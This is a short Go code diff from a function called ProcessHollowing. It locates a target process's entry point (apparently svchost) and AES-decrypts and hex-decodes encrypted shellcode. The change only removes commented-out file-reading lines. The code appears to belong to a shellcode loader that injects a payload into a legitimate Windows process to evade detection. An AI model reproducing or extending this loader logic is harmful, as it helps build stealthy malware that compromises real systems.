@@ -60,11 +60,8 @@ func ProcessHollowing(procToHollow string, shellcodeEncrypted string, key string
 	entrypoint_rva := uint(binary.LittleEndian.Uint32(data[opthdr:]))
 	addressOfEntryPoint := uintptr(entrypoint_rva+uint(svchostBase))
 
-	// shellcodeEncrypted, err := ioutil.ReadFile(shellcodeFile)
-	// if err != nil {
- //          log.Fatal(err)
- //     }
-    plaintext := crypto.DecryptAES(shellcodeEncrypted, key)
+	
+        plaintext := crypto.DecryptAES(shellcodeEncrypted, key)
 
 	shellcode, _ := hex.DecodeString(string(plaintext))
 
